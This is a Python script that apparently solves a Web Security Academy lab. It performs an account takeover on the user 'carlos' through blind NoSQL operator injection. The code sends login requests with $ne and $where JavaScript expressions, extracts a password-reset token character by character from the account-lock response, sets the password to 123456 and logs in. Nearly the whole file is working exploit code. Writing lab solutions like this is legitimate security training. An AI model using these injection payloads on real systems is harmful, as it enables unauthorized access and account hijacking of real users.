from web_security_academy.core.logger import logger, NoNewline
from bs4 import BeautifulSoup

import string


def solve_lab(session):
    data = {"csrf": session.get_csrf_token("/forgot-password"), "username": "carlos"}
    session.post_path("/forgot-password", data=data)
    logger.info('Generated a password reset token for "carlos"')

    token_key, token_value = None, None
    num_keys = get_length(session, "Object.keys(this)")

    for i in range(1, num_keys):
        expression = f"Object.keys(this)[{i}]"
        length = get_length(session, expression)
        key = get_value(session, expression, length)

        b1 = "pw" in key.lower()
        b2 = "reset" in key.lower()
        b3 = "token" in key.lower()

        if b1 or b2 or b3:
            token_key = key
            expression = f"this.{key}"

            length = get_length(session, expression)
            token_value = get_value(session, expression, length)
            break

    data = {
        "csrf": session.get_csrf_token(f"/forgot-password?{token_key}={token_value}"),
        token_key: token_value,
        "new-password-1": "123456",
        "new-password-2": "123456",
    }
    session.post_path(f"/forgot-password?{token_key}={token_value}", data=data)
    logger.info("Changed carlos's password to 123456")
    session.post_path("/login", json={"username": "carlos", "password": "123456"})
    logger.success("Successfully logged in as carlos")


def get_length(session, expression):
    logger.info(f"Extracting the length of expression {expression}...")
    length = 0
    with NoNewline():
        while True:
            json = {
                "username": "carlos",
                "password": {"$ne": "wrong-password"},
                "$where": f"{expression}.length == {length}",
            }
            resp = session.post_path("/login", json=json, allow_redirects=False)
            soup = BeautifulSoup(resp.text, "html.parser")

            if soup.find(text="Account locked: please reset your password") is None:
                logger.info(f"{length} => Invalid username or password")
                length += 1
            else:
                logger.success(f"Length of {expression}: {length}")
                return length


def get_value(session, expression, length):
    logger.info(f"Extracting the value of expression {expression}...")
    alphabet = string.ascii_letters + string.digits + string.punctuation
    value = ""

    with NoNewline():
        for i in range(length):
            for c in alphabet:
                json = {
                    "username": "carlos",
                    "password": {"$ne": "wrong-password"},
                    "$where": f"{expression}[{i}] == '{c}'",
                }
                resp = session.post_path("/login", json=json, allow_redirects=False)
                soup = BeautifulSoup(resp.text, "html.parser")

                if soup.find(text="Account locked: please reset your password") is None:
                    logger.info(
                        f"Progress: {value}... | {i}, '{c}' => Invalid username or password"
                    )
                else:
                    logger.success(
                        f"Progress: {value}... | {i}, '{c}' => Account locked: please reset your password"
                    )
                    value += c
                    break
            else:
                logger.failure(f"Unable to determine character at index {i}")
                return
        logger.success(f"Value of expression {expression}: {value}")
        return value
